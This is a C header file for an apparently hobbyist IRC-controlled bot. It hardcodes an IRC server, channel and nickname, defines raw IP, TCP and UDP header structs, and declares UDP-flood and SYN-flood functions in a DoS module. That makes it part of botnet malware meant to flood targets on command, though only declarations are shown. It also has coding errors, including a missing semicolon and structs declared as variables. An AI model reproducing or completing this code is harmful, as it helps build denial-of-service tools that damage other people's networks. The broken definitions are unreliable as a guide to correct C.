/*
 * Title: bot.h
 * Description: file contains miscellaneous 
 *              definitions, function definitions
 *              and structs
 *
 *
 *
 *
 *
 *
 */

/*
 * header guards to prevent
 * double includes
 */
#ifndef BOT_H
#define BOT_H

/*
 * max buffer size to send
 * or receive 
 */
#define MAX_MSG_SIZE 4096

/*
 * default size for malloc
 */
#define DEFAULT_MALLOC_SIZE 2048

/*
 * maximum irc name size
 */
#define MAX_NAME 31

/*
 * defining some options
 * which must be tweaked
 * per compile
 * maybe parse these 
 * options with a python
 * script
 */
#define SERVER	"irc.freenode.net"
#define PORT	6667
#define CHANNEL	"#nullbyte"
#define U_NAME	"DJYHVK"
#define N_NAME	"DJYHVK"
#define PWORD	NULL

//extern const char *admins[] = {"dontrustme"};

#ifdef _WIN32
/*
 * macro for easier sleep
 * times sleep (seconds)
 */
#define sleep(x) Sleep ((x)*1000);

#elif __linux__

/*
 * a sort of hacky solution
 * to WIN32's SOCKET typedef
 * and linux's file descriptor
 */
typedef unsigned int SOCKET

#endif

/*
 * struct containing IRC
 * details of bot
 */
typedef struct _account {
    char u_name[MAX_NAME];        // username
    char n_name[MAX_NAME];        // nickname
    char *pword;            // username's password
    char *channel;            // channel/privmsg
} Account, *pAccount;

/*
 * struct to store information
 * from received messages 
 * from IRC
 */
typedef struct _message {
    char n_name[MAX_NAME];        // nickname
    char *contact;            // channel/privmsg
    int contactSize;
    char *command;            // command
    int commandSize;
    char *param;            // command [paramter]
    int paramSize;
    char *msg;            // entire message
    int msgSize;
} Message, *pMessage;

/*
 * need to define some tcp/ip
 * header structs here 
 * the X:n means that it
 * takes up n bits
 * they are called "bit fields"
 */

// RFC 791 - https://tools.ietf.org/html/rfc791#section-3.1
struct _ip_hdr {
    unsigned char ihl:4;            // ip header len
    unsigned char version:4;        // ipv4
    unsigned char tos;                // type of service
    unsigned short tot_len;            // total length
    unsigned short id;                // unique id
    unsigned short frag_off;        // fragment offset
    unsigned char ttl;                // time to live
    unsigned char protocol;            // tcp, udp, etc.
    unsigned short check;            // checksum
    unsigned long src_addr;            // source addr
    unsigned long dest_addr;        // dest addr
} IP4_HDR, *pIP4_HDR;

// RFC 768 - https://www.ietf.org/rfc/rfc768.txt
struct _udp_hdr {
    unsigned short src_port;        // source port
    unsigned short dest_port;        // dest port
    unsigned short len;                // length
    unsigned short check;            // checksum
} UDP_HDR, *pUDP_HDR;

// RFC 793 - https://tools.ietf.org/html/rfc793#section-3.1
struct _tcp_hdr {
    unsigned short src_port;        // source port
    unsigned short dest_port;        // dest port
    unsigned long seq;                // sequence no.
    unsigned long ack_seq;            // ack no.
    unsigned short res1:4;            // reserved
    unsigned short data_off:4;        // data offset
    
    // flags
    unsigned char fin:1;             // finish
    unsigned char syn:1;            // synchronise
    unsigned char rst:1;            // reset
    unsigned char psh:1;            // push
    unsigned char ack:1;            // acknowledge
    unsigned char urg:1;            // urgent
    unsigned char ece:1;            // ecn echo
    unsigned char cwr:1;            // congestion window reduced
    
    unsigned short window;            // window
    unsigned short check;            // checksum
    unsigned short urg_ptr;            // urgent pointer
} TCP_HDR, *pTCP_HDR;

/*
 * function definitions go here
 * please make sure that only
 * functions which carry across
 * are added here, else make 
 * it static
 * also add the function
 * definitions under the 
 * respective file
 * if file comment does not
 * yet exist, please make one
 */
// bot.c
void non_fatal (char *);
void fatal (char *);

// init.c
pAccount new_account (void);
pMessage new_message (void);
SOCKET irc_connect (char *, char *);
int setup_irc (SOCKET, pAccount);
void str_to_lower (char *);
void format_message (pMessage);

// recv.c
int cleanup (SOCKET, pAccount, pMessage);
void start_recv (SOCKET, pAccount);

// dos.c
void udp_flood (SOCKET s);
void syn_flood (SOCKET s);

#endif